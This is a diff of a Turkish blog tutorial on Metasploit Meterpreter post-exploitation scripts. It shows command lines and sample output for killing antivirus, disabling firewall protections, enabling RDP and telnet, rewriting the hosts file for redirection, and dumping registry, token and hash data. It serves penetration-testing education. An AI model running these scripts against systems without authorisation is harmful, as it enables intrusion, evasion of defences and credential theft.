@@ -16,59 +16,33 @@ tags:
     - cybersecurity
     - 'metasploit framework'
 ---
-
-
 ## Meterpreter Scripting
-
-
 
 Meterpreter komut satırının güçlü yönlerinden bir tanesi de çok yönlülük ve dışarıdan başka script kodlarının kolayca adapte edilebilmesidir. Bu yazıda, Meterpreter içinde öncelikle mevcut kodların neler olduğunu göreceğiz. Ardından ilerleyen yazılarda, ihtiyaca göre kendi script kodlarımızı oluşturmayı göreceğiz.
 
-
-
 Metasploit Framework sisteminin tamamında olduğu gibi Meterpreter script kodları da Ruby programlama diliyle yazılmaktadır. Ruby hakkında yeterli bilgi sahibi değilseniz, <a href="http://ruby-doc.org/docs/ProgrammingRuby/">Ruby Programlama</a> web sitesini bir miktar incelemenizi tavsiye ediyorum.
-
-
 
 Metasploit Framework içerisinde mevcut bulunan scriptleri incelemek isterseniz, <a href="https://www.offensive-security.com/metasploit-unleashed/existing-scripts/">Github</a> adresini inceleyebilirsiniz. Mevcut scriptlerin incelenmesi bizim çok işimize yarayacaktır. Muhtemelen, sizin yapmak istediğiniz işleme ait bir örnek kod parçası mevcut scriptlerin içinde bulunmaktadır. Buradan istediğiniz kod bölümünü alarak kullanmak en mantıklı yaklaşım olacaktır.
 
-
-
 ## Mevcut Scriptler
 
-
-
 Aşağıda, bir kaç script örneği ve ne gibi işlemler yaptığı açıklanmıştır. Bu doğrultuda Ruby kodlarını inceleyebilirsiniz.
-
-
 <!-- wp:quote -->
 <blockquote class="wp-block-quote">
 Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpreter oturumu açmış olmanız gerekmektedir. Anlatımlarda, oturum açtığınız kabul edilmiştir.
 </blockquote>
 <!-- /wp:quote -->
-
-
 ## checkvm
 
-
-
 `checkvm` scripti, adından da anlaşılacağı gibi, oturumu bir sanal makinede açıp açmadığınızı kontrol etmekte kullanılır.
-
-
 ```bash
  meterpreter > run checkvm   > Checking **if **SSHACKTHISBOX-0 is a Virtual Machine ........
  > This is a VMware Workstation/Fusion Virtual Machine
 ```
 
-
-
 ## getcountermeasure
 
-
-
 `getcountermeasure` scripti, hedef sistemin güvenlik bilgisini görmeyi sağlar. Antivirüs veya Firewall u devre dışı bırakmanıza yardım eder.
-
-
 ```bash
  meterpreter > run getcountermeasure  > Running Getcountermeasure on the target... 
  > Checking for **contermeasures...
@@ -91,15 +65,9 @@ Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpr
  > Checking DEP Support Policy...
 ```
 
-
-
 ## getgui
 
-
-
 `getgui` scripti, hedef bilgisayarda RDP özelliği kapalıysa açmayı sağlar.
-
-
 ```bash
  meterpreter > run getgui 
 
@@ -124,30 +92,18 @@ OPTIONS:
  > Opening port **in **local firewall **if **necessary
 ```
 
-
-
 ## get_local_subnets
 
-
-
 `get_local_subnets` scripti, hedef bilgisayarın yerel subnet bilgilerini elde etmeyi sağlar. Bu bilgiler pivoting işlemlerinde kullanılabilir.
-
-
 ```bash
 meterpreter > run get_local_subnets 
 
 Local subnet: 10.211.55.0/255.255.255.0
 ```
 
-
-
 ## gettelnet
 
-
-
 `gettelnet` scripti, hedef bilgisayarda telnet özeliği kapalıysa, açmaya yarar.
-
-
 ```bash
 meterpreter > run gettelnet 
 Windows Telnet Server Enabler Meterpreter Script
@@ -169,15 +125,9 @@ meterpreter > run gettelnet -e
 > Opening port **in **local firewall **if **necessary
 ```
 
-
-
 ## hostsedit
 
-
-
 `hostsedit` scripti, Windows hosts dosyasına bilgi girmeye yarar. Bağlanılmak istenen web adreslerinin DNS adresleri için önce bu hosts dosyasına bakılır. Hedef bilgisayarı istenen adrese yönlendirmek için kullanılır. Her satıra bir adres girilmelidir.
-
-
 ```bash
 meterpreter > run hostsedit 
 
@@ -195,8 +145,6 @@ OPTIONS:
     -l   Text file with list of entries **in the format of IP,Hostname. One per line.
 
 Example:
-
-
 run hostsedit -e 127.0.0.1,google.com
 
 run hostsedit -l /tmp/fakednsentries.txt meterpreter > run hostsedit -e 10.211.55.162,www.microsoft.com
@@ -206,29 +154,17 @@ run hostsedit -l /tmp/fakednsentries.txt meterpreter > run hostsedit -e 10.211.5
  > Clearing the DNS Cache
 ```
 
-
-
 ## killav
 
-
-
 `killav` scripti, sistemde bir servis olarak çalışan Antivirüs programlarını devre dışı bırakmada kullanılır.
-
-
 ```bash
  meterpreter > run killav  > Killing Antivirus services on the target...
  > Killing off cmd.exe...
 ```
 
-
-
 ## remotewinenum
 
-
-
 `remotewinenum` scripti, hedef sistem hakkında bilgi etmek için kullanılır.
-
-
 ```bash
 meterpreter > run remotewinenum
 
@@ -269,15 +205,9 @@ OPTIONS:
  >     running command wimic qfe list
 ```
 
-
-
 ## scraper
 
-
-
 `scraper` scripti, `remotewinenum` ile elde edilen bilgiden daha fazlasını elde etmeye yarar. Elde edilen bilgilerin içinde registry kayıtları da bulunur.
-
-
 ```bash
 meterpreter > run scraper > New session on 10.211.55.128:4444...
  > Gathering basic system information...
@@ -290,19 +220,11 @@ meterpreter > run scraper > New session on 10.211.55.128:4444...
  > Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)
 ```
 
-
-
 Yukarıdaki örneklerde görüldüğü gibi, Meterpreter script kodlarıyla oldukça detaylı bilgi toplanabilmektedir. Bunun yanında Antivirüs veya Firewall iptal etmede de kullanılmaktadır.
-
-
 
 ## winenum
 
-
-
 `winenum` scripti, sistem hakkında en detaylı bilgiyi elde etmede kullanılabilir. Token, hash bilgileri ve diğer tüm bilgileri `winenum` scripti ile görebilirsiniz.
-
-
 ```bash
 meterpreter > run winenum  > Running Windows Local Enumerion Meterpreter Script
  > New session on 10.211.55.128:4444...
